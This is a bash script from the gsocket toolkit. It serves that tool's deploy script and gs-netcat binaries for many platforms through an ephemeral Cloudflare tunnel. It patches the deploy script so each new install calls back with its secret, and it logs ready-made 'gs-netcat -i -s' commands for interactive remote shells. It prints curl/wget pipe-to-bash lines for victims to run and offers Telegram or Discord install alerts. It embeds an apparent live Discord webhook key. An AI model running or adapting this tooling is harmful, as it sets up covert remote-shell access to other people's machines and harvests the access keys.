#! /usr/bin/env bash

# Most users never need to use this script. If you just want to deploy gsocket
# then go to https://gsocket.io/deploy or use
#    bash -c "$(curl -fsSL https://gsocket.io/x)"

# This script spins up a Cloudflare Tunnel to serve the deploy.sh script
# and all binary files from an ephemeral URL.
#
# This is helpful if the user wants to:
# 1. Received a Telegram, Discord or Webhook notification on installs
# 2. Use your own Global Socket Relay Network
#
# To run this script type:
#   bash -c "$(curl -fsSL https://gsocket.io/deploy/xs)"
# ---or---
#   LOG=results.log bash -c "$(curl -fsSL https://gsocket.io/deploy/xs)"

[[ -z $PORT ]] && PORT="32803"
DATA_DIR="gs-www-data"
packages=()
packages+=("x86_64-alpine.tar.gz")
packages+=("aarch64-linux.tar.gz")
packages+=("arm-linux.tar.gz")
packages+=("i386-alpine.tar.gz")
packages+=("i686-cygwin.tar.gz")
packages+=("mips32-alpine.tar.gz")
packages+=("mips64-alpine.tar.gz")
packages+=("mipsel32-alpine.tar.gz")
packages+=("x86_64-osx.tar.gz")
packages+=("x86_64-freebsd.tar.gz")

[[ -t 1 ]] && {
	CY="\033[1;33m" # yellow
	CDY="\033[0;33m" # yellow
	CG="\033[1;32m" # green
	CDG="\033[0;32m" # green
	CR="\033[1;31m" # red
	CDR="\033[0;31m" # red
	CC="\033[1;36m" # cyan
	CDC="\033[0;36m" # cyan
	CM="\033[1;35m" # magenta
	CDM="\033[0;35m" # magenta
	CN="\033[0m"    # none
	CW="\033[1;37m"
    CF="\e[2m"    # faint
}

do_stop()
{
    local arr

    [[ -f "cloudflare.pid" ]] && {
        kill -9 "$(cat cloudflare.pid)" &>/dev/null
        arr+=("cloudflare.pid")
    }
    [[ -f "www.pid" ]] && {
        kill -9 "$(cat www.pid)" &>/dev/null
        arr+=("www.pid")
    }

    rm -f "${arr[@]}"
}

do_cleanup()
{
    rm -f "cloudflare.log" "www_err.log" &>/dev/null
}

ERREXIT()
{
    local code
    code=$1
    shift 1
    [[ -n "$*" ]] && echo -e >&2 "$*"
    exit "$code"
}

do_sigtrap()
{
    do_stop
    do_cleanup
    echo -e "\nType ${CDC}rm -rf ${DATA_DIR} ${LOG}${CN} to clean all files."
    exit 0
}

trap do_sigtrap SIGINT SIGPIPE SIGTERM SIGHUP

check_prog()
{
    command -v "$1" >/dev/null && return
    ERREXIT 255 "Not found: $1. Please install ${CDC}${1}${CN}."
}

start()
{
    local pidfn
    local name
    local err_logfn
    name="$1"
    err_logfn="$2"
    pidfn="${name,,}.pid"
    shift 2

    [[ -e "${pidfn}" ]] && { kill -0 "$(cat "${pidfn}")" &>/dev/null || rm -f "${pidfn:?}"; }
    if [[ -e "${pidfn}" ]]; then
        echo -e >&2 "${CY}WARN${CN}: ${name} already running. To restart, type ${CDC}kill -9 $(cat ${pidfn}); rm -f ${pidfn}${CN}"
        return
    fi
    :>"${name,,}.log"
    "$@" >/dev/null 2>"${err_logfn}" &
    echo "$!" >"${pidfn}"
}

check_prog "cloudflared"
check_prog "curl"
PYTHON="python"
command -v python >/dev/null || {
    [[ "$(python3 --version 2>/dev/null)" != "Python 3"* ]] && ERREXIT 255 "Not found: python."
    PYTHON=python3
}
"$PYTHON" -m http.server -h >/dev/null || ERREXIT 255 "Python -m http.server not found."

[[ ! -d "${DATA_DIR}/bin" ]] && mkdir -p "${DATA_DIR}/bin"
[[ ! -f "${DATA_DIR}/x" ]] && {
    echo -e "Downloading ${CDY}x${CN} (e.g. deploy.sh)"
    curl -fsSL 'https://github.com/hackerschoice/gsocket/raw/master/deploy/deploy.sh' --output "${DATA_DIR}/x"
}

for n in "${packages[@]}"; do
    [[ -f "${DATA_DIR}/bin/gs-netcat_${n}" ]] && continue
    echo -e "Downloading ${CDY}gs-netcat_${n}${CN}..."
    curl -fsSL "https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_${n}" --output "${DATA_DIR}/bin/gs-netcat_${n}"
done

start "Cloudflare" "cloudflare.log" cloudflared tunnel --url "http://127.0.0.1:${PORT}" --no-autoupdate
start "www" "www_err.log" "$PYTHON" -m http.server --bind 127.0.0.1 --directory "${DATA_DIR}" "${PORT}"
i=0
while :; do
    str=$(grep -E "https://.*trycloudflare.com" cloudflare.log  | tail -n1 | cut -f2 -d'|' | sed 's/ //g')
    [[ -n $str ]] && break
    ((i++))
    [[ $i -gt 10 ]] && {
        do_stop
        ERREXIT 255 "Could not get cloudflare tunnel. See cloudflare.log for details."
    }
    sleep 1
done

str="${str:8}"  # cut of https://
str="${str//[^[:alnum:]].-}"  # sanitize
[[ -z $str ]] && {
    do_stop
    ERREXIT 255 "Could not get CF URL. See cloudflare.log for details"
}
URL_BASE="https://${str}"

# update deploy.sh
sed "s|^URL_BASE=.*|URL_BASE=\"${URL_BASE}\"|" -i "${DATA_DIR}/x"
sed "s|^gs_deploy_webhook=.*|gs_deploy_webhook='${URL_BASE}/results.php?s=\${GS_SECRET}'|" -i "${DATA_DIR}/x"
sed 's|^GS_WEBHOOK_404_OK=.*|GS_WEBHOOK_404_OK=1|' -i "${DATA_DIR}/x"

echo -e "\
${CDG}All successfull deployments will be shown below.${CN}
${CDY}To log via Telegram, Discord or webhook.site please edit
${CW}$(realpath "$(pwd)/${DATA_DIR}/x")${CDY} and set${CN}
1. ${CDC}GS_TG_TOKEN=${CN}, ${CDC}GS_TG_CHATID=${CN} OR ${CDC}GS_DISCORD_KEY=${CN} OR ${CDC}GS_WEBHOOK_KEY=${CN}
${CW}${CF}Set the IP/HOST and PORT if you run your OWN Relay Network:
${CF}2. ${CC}${CF}GS_HOST=1.2.3.4${CN}, ${CC}${CF}GS_PORT=443${CN}
To deploy gsocket:
    ${CM}bash -c \"\$(curl -fsSL ${URL_BASE}/x)\"${CN}
    ${CM}bash -c \"\$(wget --no-verbose -O- ${URL_BASE}/x)\"${CN}
or set the variable during deployment. Example:
    ${CDM}GS_DISCORD_KEY='1106565073956253736/mEDRS5iY0S4sgUnRh8Q5pC4S54zYwczZhGOwXvR3vKr7YQmA0Ej1-Ig60Rh4P_TGFq-m' \\
    bash -c \"\$(curl -fsSL ${URL_BASE}/x)\"${CN}
Press CTRL-C to stop
${CDG}-----RESULTS BELOW-----${CN}"

# a dirty hack to retrieve results: The deploy scripts requests an
# non-existing PATH/$SECRET and we retrieve it from the error log.
tail -f www_err.log | while read -r str; do
    str="${str//[^[:alnum:] \/:.&=?]/}"  # sanitize
    str="${str##*GET \/results.php?s=}"
    str="${str%% *}"
    str="${str//[^[:alnum:]]/}"  # sanitize
    [[ ${#str} -ne 22 ]] && continue
    d="$(date -u)"
    echo -e "[${CDG}${d}${CN}] ${CDC}gs-netcat -i -s '${CC}${str}${CDC}'${CN}"
    [[ -n $LOG ]] && echo -e "[${d}] gs-netcat -i -s '${str}'" >>"${LOG}"
done
do_sigtrap
